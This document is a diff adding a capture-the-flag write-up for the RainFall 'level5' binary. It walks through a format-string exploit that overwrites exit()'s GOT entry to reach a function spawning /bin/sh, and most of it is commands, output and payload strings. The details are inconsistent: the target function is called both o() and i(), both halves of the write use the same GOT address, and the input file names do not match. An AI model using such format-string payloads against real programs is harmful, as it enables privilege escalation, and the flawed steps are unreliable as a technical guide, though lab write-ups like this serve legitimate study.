@@ -1,0 +1,60 @@
+this level is an GOT overwrite exploitation
+
+at the end of n() function, it calls exit();
+asically, when the program is executed, the GOT (Global Offset Table) is initialized for every external functions (like libc functions).
+By doing so, the executable will cache the memory address in the GOT,
+so that it doesn’t have to ask libc each time an external function is called.
+
+so at this point we know we can overwrite the got exit() address since libc is shared across all binary files
+
+
+same as 2 level before, we do not write to an variable address value, we overwrite an function address to an other one =)
+
+Find the address of o() (a function that is not called but compiled with the binary and contains a call with system('/bin/sh') =)
+Find the address of exit() in GOT
+Find the offset of our string on the stack
+Write the proper exploit string
+
+level5@RainFall:~$ objdump -R level5
+
+level5:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049814 R_386_GLOB_DAT    __gmon_start__
+08049848 R_386_COPY        stdin
+08049824 R_386_JUMP_SLOT   printf
+08049828 R_386_JUMP_SLOT   _exit
+0804982c R_386_JUMP_SLOT   fgets
+08049830 R_386_JUMP_SLOT   system
+08049834 R_386_JUMP_SLOT   __gmon_start__
+08049838 R_386_JUMP_SLOT   exit
+0804983c R_386_JUMP_SLOT   __libc_start_main
+
+
+address of 'o' function: 080484a4
+address of 'exit' function 08049838
+
+We have to change the value pointed by 08049838 (exit()) with the address of i(): 080484a4.
+Now, concerning the position of our string, it’s the 4th parameters on the stack :
+
+level5@RainFall:~$ ./level5
+AAAA %p %p %p %p %p %p
+AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025
+
+\x38\x98\x04\x08\x38\x98\x04\x08%<val1>x%4$hn%<val2>x%5$hn
+
+we write 134518840 in 2 parr (low bytes + high bytes because it can be very slow, (infinity if very long) at this point we do not need but it can be good practice
+
+Low order bytes = 84a4 (33956 in decimal)
+High order bytes = 0804 (2052 in decimal)
+
+2052 - 8 byte for the 2 addresses
+
+33956 - the 2052 byte we already wrote
+
+\x38\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904%5$hn
+
+python -c 'import sys; sys.stdout.write("\x38\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn")' > /tmp/input
+
+cat /tmp/xd - | ./level5
